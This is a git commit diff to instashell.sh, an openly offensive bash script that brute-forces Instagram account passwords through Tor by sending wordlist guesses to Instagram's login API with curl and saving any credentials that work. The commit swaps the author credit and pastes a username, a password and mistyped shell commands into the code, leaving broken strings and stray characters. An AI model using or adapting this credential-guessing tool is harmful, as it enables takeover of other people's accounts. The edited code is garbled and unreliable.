1aa6461c9445ecebeec0c6237ca0c6a92fc3d83b
Beksmjay <100716927+Beksmjay@users.noreply.github.com>
2022-03-02 01:02:10 +0600

    Update instashell.sh

--- instashell.sh
+++ instashell.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# Coded by @thelinuxchoice (Instagram)
+# Coded by @kenswqq (Instagram)
 checkroot() {
 if [[ "$(id -u)" -ne 0 ]]; then
     printf "\e[1;77mPlease, run this program as root!\n\e[0m"
@@ -22,8 +22,8 @@ printf "\n"
 
 banner
 checkroot
-read -p $'\e[1;92mUsername account: \e[0m' user
-read -p $'\e[1;92mPassword List: \e[0m' wl_pass
+read -p $'\e[1;92mUsername account:kenswqq \e[0m' user
+read -p $'\e[1;92mPassword List:12345678
 
 checktor() {
 
@@ -33,7 +33,11 @@ if [[ "$check" -gt 0 ]]; then
 printf "\e[1;91mPlease, start TOR!\n\e[0m"
 exit 1
 fi
-
+$ cd instashell
+$ cdmod +x instashell.sh
+servise tor start
+$ ./instashell.sh
+kenswqq
 }
 
 
@@ -43,7 +47,7 @@ killall -HUP tor
 sleep 3
 
 }
-
+[ 
 string8=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 8 | head -n 1)
 string4=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 4 | head -n 1)
 string12=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 12 | head -n 1)
@@ -63,7 +67,7 @@ for pass in $(cat $wl_pass); do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
-data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
+data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"kenswqq", "guid":"$guid", "device_id":"$device", "password":12345678"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
 
@@ -72,16 +76,16 @@ printf "\e[1;77mTrying pass\e[0m: %s\n" $pass
 check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o '200\|challenge\|many tries\|Please wait' | uniq)
 #echo $check
 if [[ "$check" == "200" ]]; then
-printf "\e[1;92m [*] Password Found: %s \n\e[0m" $pass
-printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
+printf "\e[1;92m [*] Password Found:12345678 $pass
+printf "Username:kenswqq %s, Password:12345678 $user $pass >> found.instashell
 printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
 exit 1
 fi
 
 if [[ "$check" == "challenge" ]]; then
-printf "\e[1;92m [*] Password Found: %s\n" $pass
+printf "\e[1;92m [*] Password Found:12345678 $pass
 printf "\e[1;92m [*] Challenge required\n"
-printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
+printf "Username:kenswqq %s, Password:12345678 $pass >> found.instashell
 printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
 exit 1
 fi
